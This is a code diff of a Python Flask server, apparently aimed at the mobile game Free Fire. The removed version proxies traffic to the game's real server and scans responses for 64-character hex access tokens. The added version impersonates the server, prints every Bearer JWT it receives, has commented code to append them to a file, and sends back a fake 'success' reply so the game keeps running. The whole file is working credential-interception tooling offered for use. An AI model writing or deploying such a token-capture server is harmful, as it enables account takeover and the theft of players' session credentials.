@@ -1,86 +1,52 @@
-from flask import Flask, request, jsonify, Response
-import requests
-import os
-import re
+from flask import Flask, request, jsonify
 import json
+import os
+from datetime import datetime
 
 app = Flask(__name__)
-REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')
 
-@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
-@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
-def proxy(user_id, subpath):
-    if subpath:
-        real_url = f"{REAL_SERVER}/{subpath}"
-    else:
-        real_url = f"{REAL_SERVER}/"
-
-    print(f"\n🔹 Proxying {request.method} {real_url}")
-
-    # Prepare headers – remove host/connection, set correct Host
-    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
-    headers.pop('Content-Length', None)
-    headers['Host'] = REAL_SERVER.replace('https://', '').split('/')[0]
-
+@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
+@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
+def capture(user_id, subpath):
     try:
-        resp = requests.request(
-            method=request.method,
-            url=real_url,
-            headers=headers,
-            data=request.get_data(),
-            params=request.args,
-            allow_redirects=False,
-            timeout=30
-        )
-    except Exception as e:
-        print(f"❌ Proxy error: {e}")
-        return jsonify({"status": "error", "message": str(e)}), 500
+        print(f"\n🔹 Incoming request from {user_id}")
+        print(f"   Sub‑path: {subpath if subpath else '(root)'}")
+        print(f"   Method: {request.method}")
 
-    print(f"   Response status: {resp.status_code}")
-
-    # ── Try to parse as JSON ──
-    found_hex = False
-    try:
-        data = resp.json()
-        print(f"   JSON response (first 500 chars):\n{json.dumps(data, indent=2)[:500]}")
-        # Search for any key with 'token' or 'access'
-        for key in data:
-            if 'token' in key.lower() or 'access' in key.lower():
-                val = data[key]
-                if isinstance(val, str) and len(val) == 64 and re.match(r'^[0-9a-fA-F]{64}$', val):
-                    print(f"🎯 HEX ACCESS TOKEN (JSON): {val}")
-                    found_hex = True
-                else:
-                    print(f"🔑 Found '{key}': {str(val)[:40]}...")
-    except:
-        # Not JSON – log as raw and also search binary for hex
-        raw = resp.text
-        print(f"   Raw response (first 300 chars): {raw[:300]}...")
-
-        # ── SEARCH BINARY CONTENT FOR 64‑CHAR HEX ──
-        hex_pattern = re.compile(rb'[0-9a-fA-F]{64}')
-        matches = hex_pattern.findall(resp.content)
-        if matches:
-            for match in matches:
-                hex_token = match.decode()
-                print(f"🎯 HEX ACCESS TOKEN FOUND IN BINARY: {hex_token}")
-                found_hex = True
+        # ── CAPTURE JWT FROM AUTHORIZATION HEADER ──
+        auth_header = request.headers.get('Authorization')
+        if auth_header and auth_header.startswith('Bearer '):
+            jwt_token = auth_header[7:]  # remove "Bearer "
+            print(f"\n✅ JWT CAPTURED! 🎯")
+            print(f"   JWT: {jwt_token}")
+            # Optional: save to file
+            # with open("jwts.txt", "a") as f:
+            #     f.write(f"{jwt_token}\n")
         else:
-            print("   No 64‑hex token found in binary response.")
+            print("   No JWT in Authorization header.")
 
-    # ── Return the real server's response ──
-    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
-    response_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded_headers]
+        # Log other headers (optional)
+        print(f"   Headers: {dict(request.headers)}")
 
-    return Response(
-        resp.content,
-        status=resp.status_code,
-        headers=response_headers
-    )
+        # Log body (if any) – not needed for JWT, but keep for debugging
+        data = request.get_json(silent=True)
+        if data:
+            print(f"   Body JSON: {json.dumps(data, indent=2)}")
+        else:
+            raw = request.get_data(as_text=True)
+            if raw:
+                print(f"   Raw body: {raw[:500]}...")
+
+        # Respond with success (keep game happy)
+        return jsonify({"status": "success", "message": "OK"}), 200
+
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/')
 def home():
-    return "Token capture proxy is running!", 200
+    return "Token capture server is running!", 200
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
